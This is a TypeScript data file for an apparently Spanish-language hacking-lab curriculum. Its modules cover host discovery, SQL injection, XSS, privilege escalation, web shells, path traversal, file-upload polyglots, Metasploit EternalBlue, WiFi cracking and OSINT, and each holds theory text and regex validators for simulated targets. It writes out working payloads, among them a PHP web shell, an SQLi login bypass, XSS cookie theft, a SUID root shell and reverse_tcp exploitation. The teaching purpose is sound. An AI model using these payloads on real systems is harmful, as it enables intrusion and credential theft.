export interface ModuleContent {
    id: string;
    title: string;
    description: string;
    difficulty: 'Principiante' | 'Intermedio' | 'Avanzado';
    theory_block: string; // The "Ground Truth" text
    video_url?: string; // Optional YouTube ID or URL
    lab_config: {
        target_ip: string;
        target_os: string;
        open_ports: number[];
        vulnerabilities: string[];
    };
    success_criteria: string[];
    validation_rules?: {
        allowed_commands: RegExp[]; // Regex list for valid commands in this module
        expected_output_match?: string[]; // Keywords to simulate in output
    };
}

export const ACADEMIC_CURRICULUM: Record<string, ModuleContent> = {
    'Fundamentos': {
        id: 'MOD-001',
        title: 'Fundamentos de Reconocimiento Activo (Network Discovery)',
        description: 'Aprende a mapear una red desconocida utilizando el protocolo ICMP y TCP.',
        difficulty: 'Principiante',
        video_url: '4t4kBkMsDbQ', // NetworkChuck - Nmap
        lab_config: {
            target_ip: '10.10.10.5',
            target_os: 'Linux Ubuntu 20.04 LTS',
            open_ports: [22, 80],
            vulnerabilities: []
        },
        theory_block: `
# FASE 1: DESCUBRIMIENTO DE HOSTS (HOST DISCOVERY)

## 🧠 Concepto Clave: ¿Hay alguien ahí?
Imagina que estás en un edificio a oscuras (la red) y quieres saber en qué habitaciones hay gente.
El **Host Discovery** es como ir tocando puertas o gritando "¿Hola?" para ver quién responde. En ciberseguridad, antes de atacar, necesitas saber qué computadoras (hosts) están encendidas y conectadas.

## 📡 El Protocolo ICMP ("El Ping")
Es el equivalente digital a un sonar de submarino.
- **Tú envías (Echo Request):** "¿Estás vivo?"
- **Ellos responden (Echo Reply):** "Sí, estoy aquí".

Herramienta: \`ping <IP>\`

## 🛡️ El Muro de Fuego (Firewall)
A veces, los administradores configuran "Firewalls" que actúan como guardias de seguridad silenciosos. Tú preguntas "¿Estás ahí?", pero el guardia te ignora deliberadamente.
Si usas \`ping\` y no responden, no siempre significa que no estén. Simplemente pueden estar ignorándote.

## 🔧 La Solución: Nmap (Network Mapper)
Cuando el toque suave falla, usamos **Nmap**. Es como un escáner de rayos X.
Si no responden al saludo normal (ICMP), Nmap intenta trucos más técnicos:
1. **TCP SYN Ping (-PS):** Simula que quiere iniciar una conversación web (puerto 80). Aunque el firewall bloquee el saludo, a veces deja pasar el intento de conexión para negocios.
   - *Analogía:* Si no abren cuando tocas el timbre, intentas girar el pomo de la puerta principal.

## 🎯 TU MISIÓN
Investiga la red. Tu objetivo es confirmar que la IP **10.10.10.5** está operativa, incluso si intenta esconderse.
        `,
        success_criteria: [
            "Identificar el estado del host (UP/DOWN)",
            "Determinar la latencia de red (TTL)",
            "Realizar un escaneo sin resolución DNS para mayor velocidad"
        ],
        validation_rules: {
            allowed_commands: [
                /^ping\s+[\w.-]+$/,
                /^nmap\s+.*-sn.*$/,
                /^nmap\s+.*-PS.*$/,
                /^nmap\s+.*-PR.*$/
            ],
            expected_output_match: ["Host is up", "ttl=", "MAC Address"]
        }
    },
    'SQL Injection': {
        id: 'MOD-002',
        title: 'Inyección SQL (SQLi) - Manipulación de Bases de Datos',
        description: 'Compromete la autenticación de una aplicación web manipulando consultas SQL.',
        difficulty: 'Intermedio',
        video_url: 'ciNHn38EyRc', // Computerphile - SQL Injection
        lab_config: {
            target_ip: '10.10.10.15',
            target_os: 'CentOS 7',
            open_ports: [80, 3306],
            vulnerabilities: ['SQL Injection (Login Bypass)', 'Union-Based SQLi']
        },
        theory_block: `
# FASE 2: INYECCIÓN SQL (SQLi)

## 🧠 Concepto Clave: Engañando al Bibliotecario
Imagina que una página web es un bibliotecario que busca información por ti.
Tú le das un nombre de usuario, y él busca en sus ficheros:
*"Bibliotecario, por favor dame la ficha del usuario [TU_NOMBRE]"*.

Una **Inyección SQL** ocurre cuando, en lugar de dar solo tu nombre, das una orden disfrazada.
Tú dices: *"dame la ficha del usuario [Juan, O mejor dame TODAS las fichas]"*.
Si el bibliotecario es ingenuo (no "sanitiza" o limpia lo que dices), te obedecerá ciegamente.

## 🔓 El Truco Maestro: La Tautología
Para entrar sin contraseña, usamos una "Mentira que siempre es verdad".
En lógica, la afirmación **"1 es igual a 1"** siempre es VERDADERA.

Si le dices al sistema:
*"Déjame entrar si mi usuario es 'admin' O si 1=1"*.
Como 1 siempre es igual a 1, la condición se cumple, y la puerta se abre, ¡sin importar la contraseña!

Comando típico: \`admin' OR 1=1 --\`
(El \`--\` es para decirle al bibliotecario "ignora todo lo que venga después", como la verificación de contraseña real).

## 🎯 TU MISIÓN
El panel de administración es vulnerable. Engaña a la base de datos usando una tautología para entrar como administrador sin saber la contraseña.
        `,
        success_criteria: [
            "Realizar un bypass de autenticación exitoso",
            "Identificar el número de columnas con ORDER BY",
            "Extraer la versión de la base de datos",
            "Obtener hashes de contraseñas de la tabla de usuarios"
        ],
        validation_rules: {
            allowed_commands: [
                /.*'.*OR.*1=1.*/i,  // Generic tautology
                /.*UNION.*SELECT.*/i,
                /.*ORDER.*BY.*/i,
                /.*admin' --.*/
            ],
            expected_output_match: ["Welcome, admin!", "MySQL v5.7.33", "Database: production"]
        }
    },
    'Web Exploitation': {
        id: 'MOD-003',
        title: 'Cross-Site Scripting (XSS) y Seguridad del Lado del Cliente',
        description: 'Ejecuta código arbitrario en navegadores de otros usuarios mediante vulnerabilidades XSS.',
        difficulty: 'Intermedio',
        video_url: 'EoaDgUgS6QA', // Computerphile - XSS
        lab_config: {
            target_ip: '10.10.10.20',
            target_os: 'Debian 11',
            open_ports: [8080],
            vulnerabilities: ['Stored XSS', 'Reflected XSS']
        },
        theory_block: `
# FASE 3: CROSS-SITE SCRIPTING (XSS)

## 🧠 Concepto Clave: El Caballo de Troya
A diferencia del ataque anterior (que atacaba a la base de datos del servidor), el **XSS** ataca a los **otros usuarios** que visitan la web.

Imagina que puedes escribir un comentario en un foro. En lugar de escribir "¡Hola!", escribes un código invisible que dice: *"Quien lea esto, envíame su cartera por correo"*.
Cuando otra persona inocente entra al foro y su navegador lee tu comentario, ejecuta la orden sin saberlo.

## 🍪 El Botín: Las Cookies de Sesión
Cuando entras a Facebook o Gmail, no metes tu contraseña a cada segundo. El servidor te da una "Cookie" (como una pulsera VIP de un festival) para recordarte.
Si logras ejecutar código JavaScript en el navegador de tu víctima (XSS), puedes decirle:
*"Mándame una copia de tu pulsera VIP a mi servidor".*
Con esa copia, ¡puedes hacerte pasar por ella sin saber su contraseña!

## 🧪 El Experimento
Para probar si un sitio es vulnerable, intentamos inyectar un script inofensivo primero, como una ventana de alerta:
\`<script>alert('Hackeado')</script>\`
Si ves la ventana emergente, ¡el sitio acepta órdenes de extraños!

## 🎯 TU MISIÓN
Encuentra un campo de texto donde puedas inyectar código JavaScript y hazlo dispararse.
        `,
        success_criteria: [
            "Identificar parámetros vulnerables en la URL o formularios",
            "Ejecutar un payload básico de prueba (alert/confirm)",
            "Comprender la diferencia entre contextos HTML y atributos JS",
            "Simular el robo de una cookie de sesión"
        ],
        validation_rules: {
            allowed_commands: [
                /.*<script>.*alert\(.*\).*<\/script>.*/,
                /.*document\.cookie.*/,
                /.*fetch\(.*\).*/,
                /.*<img.*src=x.*onerror=.*/
            ],
            expected_output_match: ["Request intercepted", "Cookie: session_id=", "XSS Vulnerability Detected"]
        }
    },
    'Network Scanning': {
        id: 'MOD-004',
        title: 'Enumeración Avanzada y Detección de Servicios',
        description: 'Profundiza en el reconocimiento utilizando scripts NSE y técnicas avanzadas de Nmap.',
        difficulty: 'Avanzado',
        video_url: 'Hk-21p2m8YY', // HackerSploit - Nmap Scripts
        lab_config: {
            target_ip: '10.10.10.25',
            target_os: 'Windows Server 2019',
            open_ports: [53, 80, 135, 139, 445, 3389],
            vulnerabilities: ['SMB Signing Disabled', 'Outdated IIS', 'Default SNMP Credentials']
        },
        theory_block: `
# FASE 4: ENUMERACIÓN AVANZADA (Investigación Profunda)

## 🧠 Concepto Clave: Interrogatorio Policial
En la Fase 1 solo vimos quién estaba "vivo". Ahora necesitamos su ficha completa.
Saber que el puerto 80 está abierto no es suficiente. Necesitamos saber:
1. **¿Qué software corre ahí?** (Ej: ¿Es un servidor Apache viejo o uno nuevo?)
2. **¿Qué versión exacta?** (Las versiones viejas tienen fallos conocidos).
3. **¿Qué sistema operativo usan?** (No se ataca igual a Windows que a Linux).

## 🕵️ Nmap Scripting Engine (NSE)
Nmap no solo mira puertos. Tiene un cerebro propio con "scripts" (pequeños programas en lenguaje Lua) que pueden hacer tareas de detective:
- **-sV (Service Version):** Analiza la "firma" o respuesta del servicio y te dice: "Esto es un Apache 2.4.49".
- **-sC (Default Scripts):** Ejecuta un paquete de pruebas seguras para sacar información extra (títulos de webs, claves SSH públicas, etc.).
- **-A (Aggressive):** ¡El modo "Bestia"! Activa detección de OS, versiones, scripts y trazado de ruta de una sola vez. (Cuidado, es ruidoso y fácil de detectar).

## 🎯 TU MISIÓN
Usa Nmap en modo agresivo o con detección de versiones para obtener la "huella digital" completa del objetivo. Busca software obsoleto.
        `,
        success_criteria: [
            "Detectar versiones exactas de servicios (Banner Grabbing)",
            "Identificar el Sistema Operativo con precisión",
            "Listar scripts NSE ejecutados y sus resultados",
            "Encontrar al menos un servicio con configuración insegura"
        ],
        validation_rules: {
            allowed_commands: [
                /^nmap\s+.*-sV.*$/,
                /^nmap\s+.*-sC.*$/,
                /^nmap\s+.*-A.*$/,
                /^nmap\s+.*--script.*$/
            ],
            expected_output_match: ["Apache httpd 2.4.49", "Windows Server 2019", "SMB Signing: disabled", "VULNERABLE"]
        }
    },
    'Password Cracking': {
        id: 'MOD-005',
        title: 'Cracking de Contraseñas con Hydra y Hashcat',
        description: 'Aprende a realizar ataques de fuerza bruta y cracking de hashes para recuperar credenciales.',
        difficulty: 'Intermedio',
        video_url: '_vANAnHOPr8', // John Hammond - Password Cracking
        lab_config: {
            target_ip: '10.10.10.30',
            target_os: 'Linux Ubuntu 20.04',
            open_ports: [22, 21],
            vulnerabilities: ['Weak SSH Password', 'Default FTP Credentials', 'Unsalted MD5 Hashes']
        },
        theory_block: `
# FASE 5: PASSWORD CRACKING (Romper Contraseñas)

## 🧠 Concepto Clave: El Ataque de Diccionario
Las contraseñas son como cerraduras. Si no tienes la llave, puedes probar todas en un llavero hasta que una funcione.
Los ataques de **fuerza bruta** intentan miles de combinaciones por segundo hasta encontrar la correcta.

## 🔨 Herramienta 1: Hydra (The Network Login Cracker)
Hydra es como un robot que prueba contraseñas automáticamente en servicios de red (SSH, FTP, HTTP).

**Comando básico:**
\`hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.30\`
- **-l admin**: Usuario conocido
- **-P rockyou.txt**: Lista de contraseñas comunes (diccionario)
- **ssh://IP**: Servicio objetivo

## 🔐 Herramienta 2: Hashcat (Hash Cracking)
A veces encuentras contraseñas "hasheadas" (encriptadas). Hashcat puede descifrarlas comparando con un diccionario.

**Tipos de hash comunes:**
- **MD5**: \`5f4dcc3b5aa765d61d8327deb882cf99\` (muy débil, fácil de romper)
- **SHA-256**: Más seguro pero aún vulnerable si la contraseña es débil

## 🎯 TU MISIÓN
El servidor SSH tiene una contraseña débil. Usa Hydra con el diccionario rockyou.txt para encontrarla.
        `,
        success_criteria: [
            "Identificar servicios con autenticación débil",
            "Ejecutar ataque de fuerza bruta exitoso con Hydra",
            "Obtener credenciales válidas",
            "Comprender el tiempo estimado de un ataque (speed rate)"
        ],
        validation_rules: {
            allowed_commands: [
                /^hydra.*/i,
                /^hashcat.*/i,
                /^john.*/i,
                /^ssh.*@.*/
            ],
            expected_output_match: ["login:", "password:", "valid password found", "host:"]
        }
    },
    'Privilege Escalation': {
        id: 'MOD-006',
        title: 'Escalación de Privilegios en Linux',
        description: 'Aprende cómo un atacante puede pasar de usuario normal a root explotando configuraciones inseguras.',
        difficulty: 'Avanzado',
        video_url: 'ZTnwg3qCdVM', // IppSec - Linux Privilege Escalation
        lab_config: {
            target_ip: '10.10.10.35',
            target_os: 'Linux Debian 10',
            open_ports: [22],
            vulnerabilities: ['SUID Binary Misconfiguration', 'Writable /etc/passwd', 'Sudo ALL=(ALL) NOPASSWD']
        },
        theory_block: `
# FASE 6: PRIVILEGE ESCALATION (Escalación de Privilegios)

## 🧠 Concepto Clave: Del Empleado al CEO
Imagina que logras entrar a un edificio como empleado de limpieza. Ahora tu objetivo es convertirte en el CEO.
En Linux, un usuario normal tiene permisos limitados. **Root** es el superusuario (administrador total).

## 🔍 Técnicas de Enumeración
Primero debes investigar el sistema en busca de debilidades:
1. **Binarios SUID:** Archivos que se ejecutan con privilegios de root
   \`find / -perm -4000 2>/dev/null\`
2. **Permisos de Sudo:** ¿Qué comandos puedo ejecutar como root?
   \`sudo -l\`
3. **Archivos escribibles críticos:** ¿Puedo modificar /etc/passwd?
   \`find / -writable -type f 2>/dev/null | grep -v proc\`

## 💣 Explotación: SUID Abuse
Si encuentras un programa como \`/usr/bin/find\` con SUID activado, puedes abusar de él:
\`find . -exec /bin/bash -p \\;\`
Esto te da una shell con privilegios elevados.

## 🛡️ ¿Por qué funciona?
Los administradores a veces dan SUID a programas que no deberían tenerlo, o usan \`sudo ALL=(ALL) NOPASSWD\` por comodidad.

## 🎯 TU MISIÓN
Has comprometido una cuenta de bajo privilegio. Encuentra el vector de escalación y obtén una shell root.
        `,
        success_criteria: [
            "Enumerar binarios SUID en el sistema",
            "Identificar configuraciones sudo inseguras",
            "Ejecutar un exploit de escalación",
            "Obtener una shell de root (#)"
        ],
        validation_rules: {
            allowed_commands: [
                /^find.*-perm.*4000.*/,
                /^sudo\s+-l/,
                /^ls\s+-la\s+\/etc\/passwd/,
                /^getcap.*/,
                /.*\/bin\/bash.*/
            ],
            expected_output_match: ["root", "uid=0", "SUID", "/bin/bash"]
        }
    },
    'Web Shells': {
        id: 'MOD-007',
        title: 'Web Shells y Backdoors Persistentes',
        description: 'Aprende a mantener acceso persistente mediante shells web y backdoors en servidores comprometidos.',
        difficulty: 'Intermedio',
        video_url: 'x41EsVFK-WQ', // LiveOverflow - Web Shells
        lab_config: {
            target_ip: '10.10.10.40',
            target_os: 'Linux CentOS 7',
            open_ports: [80, 443],
            vulnerabilities: ['File Upload (No Validation)', 'Remote Code Execution', 'Directory Listing Enabled']
        },
        theory_block: `
# FASE 7: WEB SHELLS (Puertas Traseras Web)

## 🧠 Concepto Clave: Tu Propio Portal de Control
Un **Web Shell** es un script malicioso (PHP, ASP, JSP) que actúa como una "consola remota" desde el navegador.
Una vez subido al servidor, puedes ejecutar comandos del sistema operativo desde tu móvil, laptop, cualquier lugar.

## 📤 El Vector: File Upload sin Validación
Muchas aplicaciones web permiten "subir avatar" o "adjuntar documentos". Si no validan el tipo de archivo, puedes subir código ejecutable.

**Ejemplo de Web Shell básico (PHP):**
\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`

Si lo subes como \`shell.php\` y navegas a \`http://target.com/uploads/shell.php?cmd=whoami\`, el servidor ejecuta el comando.

## 🎭 Técnicas de Bypass
Los filtros pueden bloquear extensiones \`.php\`. Trucos comunes:
- **Double Extension:** \`shell.php.jpg\` (el servidor lo procesa como PHP)
- **Null Byte:** \`shell.php%00.jpg\` (en versiones viejas de PHP)
- **Content-Type Spoofing:** Cambiar el header MIME a \`image/jpeg\`

## 🔗 Reverse Shell vs Web Shell
- **Web Shell:** Accedes visitando una URL (\`target.com/shell.php\`)
- **Reverse Shell:** El servidor se "conecta de vuelta a ti" (más sigiloso)

## 🎯 TU MISIÓN
El servidor tiene un formulario de upload vulnerable. Sube un web shell y ejecuta comandos remotos.
        `,
        success_criteria: [
            "Identificar un endpoint de file upload",
            "Bypassear filtros de extensión",
            "Subir y activar un web shell funcional",
            "Ejecutar comandos remotos (whoami, ls)"
        ],
        validation_rules: {
            allowed_commands: [
                /curl.*upload.*/i,
                /wget.*/i,
                /.*shell\.php.*/,
                /.*system\(.*/,
                /.*exec\(.*/
            ],
            expected_output_match: ["shell.php", "uploaded", "www-data", "Command executed"]
        }
    },
    'Directory Traversal': {
        id: 'MOD-008',
        title: 'Path Traversal y Local File Inclusion (LFI)',
        description: 'Explota vulnerabilidades de manejo de rutas para leer archivos sensibles del servidor.',
        difficulty: 'Intermedio',
        video_url: 'BAh8COF9rxY', // PwnFunction - Path Traversal
        lab_config: {
            target_ip: '10.10.10.45',
            target_os: 'Linux Alpine',
            open_ports: [80],
            vulnerabilities: ['Path Traversal in ?file= parameter', 'Unrestricted File Read', 'LFI to RCE']
        },
        theory_block: `
# FASE 8: PATH TRAVERSAL (Recorrer Directorios Prohibidos)

## 🧠 Concepto Clave: Salir de la Cárcel
Imagina que estás en una biblioteca y solo puedes pedir libros de la sección infantil.
Pero si le pides al bibliotecario: *"Dame el libro '../adultos/secretos.pdf'"*, puede que accidentalmente te lo dé.
El **Path Traversal** es "salirse de la carpeta permitida" usando \`../\` (subir un nivel).

## 🕵️ El Ataque Típico
Muchas apps web leen archivos según parámetros:
\`http://example.com/page.php?file=about.html\`

El código puede ser simplemente:
\`\`\`php
<?php include($_GET['file']); ?>
\`\`\`

Si cambias el parámetro a:
\`?file=../../../../etc/passwd\`
¡Puedes leer archivos del sistema!

## 🎯 Objetivos de Alto Valor
Archivos que todo pentester busca en Linux:
- **/etc/passwd**: Lista de usuarios del sistema
- **/etc/shadow**: Hashes de contraseñas (requiere root, pero a veces accesible)
- **/var/log/apache2/access.log**: Logs del servidor
- **~/.ssh/id_rsa**: Clave SSH privada del usuario

## 🛡️ Técnicas de Bypass
Los filtros pueden bloquear \`../\`. Variaciones:
- **Encoding:** \`..%2F\` o \`..%252F\` (URL encoding doble)
- **Absolute Path:** \`/etc/passwd\` (si no validan bien)
- **Null Byte:** \`../../../../etc/passwd%00.php\`

## 🎯 TU MISIÓN
El parámetro \`?page=\` es vulnerable a LFI. Lee el archivo \`/etc/passwd\` y busca nombres de usuario que podrías atacar después.
        `,
        success_criteria: [
            "Identificar parámetro vulnerable a Path Traversal",
            "Leer /etc/passwd exitosamente",
            "Intentar leer /etc/shadow o archivos de logs",
            "Comprender qué archivos son críticos en Linux"
        ],
        validation_rules: {
            allowed_commands: [
                /curl.*\.\.\/.*/,
                /wget.*\.\.\/.*/,
                /.*etc\/passwd.*/,
                /.*etc\/shadow.*/
            ],
            expected_output_match: ["root:x:0:0", "passwd", "etc/", "nobody"]
        }
    },
    'File Upload Exploitation': {
        id: 'MOD-009',
        title: 'Explotación de File Upload Vulnerabilities',
        description: 'Aprende técnicas avanzadas para explotar formularios de carga de archivos mal configurados.',
        difficulty: 'Avanzado',
        video_url: 'CWeWPiyE-3Y', // STÖK - File Upload Attacks
        lab_config: {
            target_ip: '10.10.10.50',
            target_os: 'Windows Server 2016',
            open_ports: [80, 443],
            vulnerabilities: ['Unrestricted File Upload', 'Command Execution via Image Processing', 'ZIP Slip']
        },
        theory_block: `
# FASE 9: FILE UPLOAD EXPLOITATION (Subida Maliciosa de Archivos)

## 🧠 Concepto Clave: El Caballo de Troya Digital
Ya conoces los Web Shells. Ahora aprenderás **todas las técnicas avanzadas** para subir archivos maliciosos.

## 🎭 Bypass de Filtros por Extensión
**Problema:** El servidor solo acepta imágenes (.jpg, .png).
**Soluciones:**
1. **Double Extension:** \`malware.php.jpg\`
2. **Case Manipulation:** \`malware.PhP\` o \`malware.pHp\`
3. **Magic Bytes:** Agregar \`FF D8 FF E0\` (firma JPEG) al inicio del archivo PHP

## 🖼️ Polyglot Files (Archivos Híbridos)
Un archivo que es **simultáneamente** una imagen válida Y código ejecutable.
Herramienta: \`exiftool\` para inyectar código PHP en metadatos de imágenes.

\`\`\`bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
\`\`\`

## 💣 ZIP Slip Attack
Si la aplicación descomprime archivos ZIP, puedes hacer que escriba fuera del directorio permitido:
\`\`\`
archivo.zip/
  ../../../var/www/html/backdoor.php
\`\`\`

## 🎯 TU MISIÓN
Sube un archivo que ejecute código en el servidor, incluso si solo se permiten "imágenes".
        `,
        success_criteria: [
            "Identificar el mecanismo de validación del servidor",
            "Crear un polyglot file (imagen + código)",
            "Bypassear filtros MIME type",
            "Lograr ejecución remota de comandos"
        ],
        validation_rules: {
            allowed_commands: [
                /exiftool.*/i,
                /curl.*upload.*/i,
                /.*\.php\.jpg/,
                /.*Content-Type.*/
            ],
            expected_output_match: ["upload successful", "shell active", "polyglot", "RCE achieved"]
        }
    },
    'Metasploit Basics': {
        id: 'MOD-010',
        title: 'Metasploit Framework - Explotación Automatizada',
        description: 'Domina el framework más poderoso de pentesting para explotar vulnerabilidades conocidas.',
        difficulty: 'Avanzado',
        video_url: 'TCPyoWHy4eA', // NetworkChuck - Metasploit
        lab_config: {
            target_ip: '10.10.10.55',
            target_os: 'Windows 7 SP1',
            open_ports: [445, 139, 3389],
            vulnerabilities: ['MS17-010 EternalBlue', 'Unpatched SMBv1', 'Default RDP Configuration']
        },
        theory_block: `
# FASE 10: METASPLOIT FRAMEWORK (El Arsenal Nuclear del Hacking)

## 🧠 Concepto Clave: Automatización de Exploits
Hasta ahora has usado herramientas individuales. **Metasploit** es una plataforma que integra miles de exploits, payloads y herramientas auxiliares.

## 🎯 Arquitectura de Metasploit
1. **Exploit:** El código que aprovecha la vulnerabilidad
2. **Payload:** Lo que quieres ejecutar en la máquina objetivo (ej: una reverse shell)
3. **Listener:** Tu máquina escuchando la conexión de vuelta

## 🚀 Flujo de Trabajo Básico
\`\`\`bash
msfconsole                              # Iniciar Metasploit
search eternalblue                      # Buscar exploits
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.55                  # Objetivo
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5                    # Tu IP
exploit                                 # ¡Ejecutar!
\`\`\`

## 🎮 Meterpreter (La Shell Suprema)
Si el exploit funciona, obtienes una sesión **Meterpreter**, una shell avanzada que puede:
- **sysinfo**: Info del sistema
- **hashdump**: Extraer hashes de contraseñas de Windows
- **screenshot**: Capturar pantalla
- **keyscan_start**: Keylogger en tiempo real

## 🛡️ ¿Por qué EternalBlue?
MS17-010 (EternalBlue) es una vulnerabilidad legendaria en SMB de Windows. Fue usada por WannaCry (ransomware 2017).
Cualquier Windows sin parchear desde XP hasta 7 es vulnerable.

## 🎯 TU MISIÓN
Usa Metasploit para explotar EternalBlue en el objetivo y obtener una sesión Meterpreter con privilegios de SYSTEM.
        `,
        success_criteria: [
            "Buscar y seleccionar el exploit correcto",
            "Configurar RHOSTS, LHOST y Payload",
            "Obtener sesión Meterpreter exitosa",
            "Ejecutar comandos post-explotación (sysinfo, hashdump)"
        ],
        validation_rules: {
            allowed_commands: [
                /msfconsole/i,
                /search.*eternalblue/i,
                /use.*exploit.*/i,
                /set.*RHOSTS.*/i,
                /exploit/i
            ],
            expected_output_match: ["Meterpreter session", "opened", "SYSTEM", "hashdump"]
        }
    },
    'Wireless Hacking': {
        id: 'MOD-011',
        title: 'Wireless Hacking - WPA/WPA2 Cracking',
        description: 'Aprende a capturar handshakes WiFi y crackear contraseñas de redes inalámbricas.',
        difficulty: 'Avanzado',
        video_url: '5W-Yg6PIL0g', // NetworkChuck - WiFi Hacking
        lab_config: {
            target_ip: 'WIFI-TARGET-SSID',
            target_os: 'Linux Kali',
            open_ports: [],
            vulnerabilities: ['WPA2-PSK Weak Password', 'Deauth Attack Vulnerable', 'WPS PIN Attack']
        },
        theory_block: `
# FASE 11: WIRELESS HACKING (Hackeo de Redes WiFi)

## 🧠 Concepto Clave: El 4-Way Handshake
Cuando un dispositivo se conecta a WiFi, realiza un "apretón de manos" (handshake) con el router.
Este handshake contiene información encriptada de la contraseña. Si lo capturas, puedes intentar crackearlo offline.

## 📡 Herramientas Clave
1. **airmon-ng**: Pone tu tarjeta WiFi en "modo monitor" (escucha todo el tráfico)
2. **airodump-ng**: Captura paquetes del aire
3. **aireplay-ng**: Inyecta paquetes (deauth attack para forzar reconexión)
4. **aircrack-ng**: Crackea el handshake capturado

## 🎯 El Ataque Paso a Paso
\`\`\`bash
airmon-ng start wlan0                   # Modo monitor
airodump-ng wlan0mon                    # Escanear redes
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Capturar red específica
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon  # Forzar desconexión
aircrack-ng -w rockyou.txt capture-01.cap  # Crackear
\`\`\`

## 🛡️ El Ataque Deauth
Envías un "paquete de desconexión" falso a un cliente conectado. Su dispositivo se desconecta y se reconecta automáticamente.
Durante esa reconexión, capturas el handshake.

## 🔐 WPS PIN Attack (Ataque más Rápido)
Si el router tiene WPS activado, puedes usar \`reaver\` para fuerza bruta del PIN (solo 11,000 combinaciones vs millones de contraseñas).

## 🎯 TU MISIÓN
Captura el 4-way handshake de la red objetivo y crackea la contraseña WPA2 usando un diccionario.
        `,
        success_criteria: [
            "Poner adaptador en modo monitor",
            "Identificar red objetivo (BSSID, Channel)",
            "Capturar 4-way handshake exitosamente",
            "Crackear contraseña con aircrack-ng"
        ],
        validation_rules: {
            allowed_commands: [
                /airmon-ng.*/i,
                /airodump-ng.*/i,
                /aireplay-ng.*/i,
                /aircrack-ng.*/i,
                /reaver.*/i
            ],
            expected_output_match: ["handshake", "WPA", "KEY FOUND", "monitor mode"]
        }
    },
    'Cryptography': {
        id: 'MOD-012',
        title: 'Criptografía y Hash Cracking',
        description: 'Comprende los fundamentos de cifrado, hashes y cómo romper esquemas criptográficos débiles.',
        difficulty: 'Intermedio',
        video_url: 'jhXCTbFnK8o', // Computerphile - Hashing Algorithms
        lab_config: {
            target_ip: '10.10.10.60',
            target_os: 'Linux Ubuntu 20.04',
            open_ports: [80, 443],
            vulnerabilities: ['MD5 Hash Collision', 'Weak Encryption (ROT13)', 'Base64 Encoding Misused']
        },
        theory_block: `
# FASE 12: CRIPTOGRAFÍA (La Ciencia del Secreto)

## 🧠 Concepto Clave: Cifrado vs Hashing
- **Cifrado (Encryption):** Reversible. \`AES("Hola", clave)\` → \`encrypted\` → \`decrypt(encrypted, clave)\` → \`"Hola"\`
- **Hashing:** Irreversible (one-way). \`MD5("password")\` → \`5f4dcc3b5aa765d61d8327deb882cf99\` (no puedes obtener "password" de vuelta matemáticamente)

## 🔐 ¿Por qué Hashear Contraseñas?
Las bases de datos no guardan tu contraseña en texto plano. Guardan su hash.
Cuando ingresas, el sistema hashea tu input y lo compara: \`hash(input) == hash_guardado\`.

## 💔 ¿Por qué MD5 es Débil?
1. **Rainbow Tables:** Tablas precalculadas de millones de hashes (ej: MD5("123456") = "e10adc3949ba...")
2. **Velocidad:** Se pueden calcular billones de hashes MD5 por segundo en GPUs modernas

## 🧂 El Contraataque: Salts
Un **salt** es un valor aleatorio agregado antes de hashear:
\`hash("password" + "randomsalt123")\`
Así, aunque dos usuarios tengan la misma contraseña, sus hashes son diferentes.

## 🛠️ Herramientas de Cracking
- **hashcat**: GPU-accelerated, extremadamente rápido
- **john the ripper**: CPU-based, versátil
- **CrackStation**: Base de datos online de hashes

## 🎯 TU MISIÓN
Te han dado un dump de hashes MD5. Identifica el tipo de hash y usa hashcat o john para crackearlos.
        `,
        success_criteria: [
            "Identificar el tipo de hash (hash-identifier)",
            "Usar hashcat o john para crackear hashes",
            "Comprender la diferencia entre salted y unsalted",
            "Crackear al menos 3 contraseñas del dump"
        ],
        validation_rules: {
            allowed_commands: [
                /hashcat.*/i,
                /john.*/i,
                /hash-identifier.*/i,
                /hashid.*/i
            ],
            expected_output_match: ["Cracked", "Status", "password", "hash"]
        }
    },
    'OSINT': {
        id: 'MOD-013',
        title: 'OSINT - Reconocimiento de Fuentes Abiertas',
        description: 'Aprende a recopilar información de inteligencia sin interactuar directamente con el objetivo.',
        difficulty: 'Principiante',
        video_url: 'qwA6MmbeGNo', // John Hammond - OSINT
        lab_config: {
            target_ip: 'target-corp.com',
            target_os: 'N/A',
            open_ports: [],
            vulnerabilities: ['Public Email Exposure', 'Leaked Credentials in Pastebin', 'Metadata in Documents']
        },
        theory_block: `
# FASE 13: OSINT (Open Source Intelligence - Inteligencia de Fuentes Abiertas)

## 🧠 Concepto Clave: El Detective Invisible
Antes de atacar técnicamente, un hacker inteligente recopila información **sin tocar el objetivo**.
OSINT es buscar datos públicos: redes sociales, registros de dominios, documentos filtrados, etc.

## 🕵️ Fuentes de Información
1. **Google Dorking:** Búsquedas avanzadas
   - \`site:target.com filetype:pdf\` (encuentra PDFs del dominio)
   - \`inurl:admin site:target.com\` (busca paneles admin)
2. **WHOIS:** Información del propietario del dominio
   - \`whois target.com\`
3. **Shodan:** Motor de búsqueda de dispositivos conectados
   - \`org:"Target Corp"\` (servidores, cámaras, IoT)
4. **theHarvester:** Recopila emails, subdominios
   - \`theHarvest -d target.com -b google\`

## 📧 Email Harvesting
Conocer emails corporativos es oro:
- Phishing dirigido
- Password spraying (probar "Company2024!" en todos)
- Búsqueda en bases de datos de brechas (HaveIBeenPwned)

## 🗺️ Subdomain Enumeration
La empresa puede tener subdominios ocultos:
- \`dev.target.com\` (ambiente de desarrollo, menos seguro)
- \`admin.target.com\` (panel de administración)
Herramientas: \`sublist3r\`, \`amass\`, \`dnsenum\`

## 📷 Metadata en Documentos
Los PDFs/imágenes en la web pueden contener:
- Nombres de usuario (autor del documento)
- Versiones de software
- Rutas de red internas
Herramienta: \`exiftool\`

## 🎯 TU MISIÓN
Recopila información sobre "target-corp.com": emails, subdominios, tecnologías usadas, empleados clave.
        `,
        success_criteria: [
            "Ejecutar Google Dorks para encontrar archivos sensibles",
            "Usar theHarvester para recopilar emails",
            "Enumerar subdominios con sublist3r",
            "Extraer metadata de documentos públicos"
        ],
        validation_rules: {
            allowed_commands: [
                /whois.*/i,
                /theHarvester.*/i,
                /sublist3r.*/i,
                /exiftool.*/i,
                /shodan.*/i
            ],
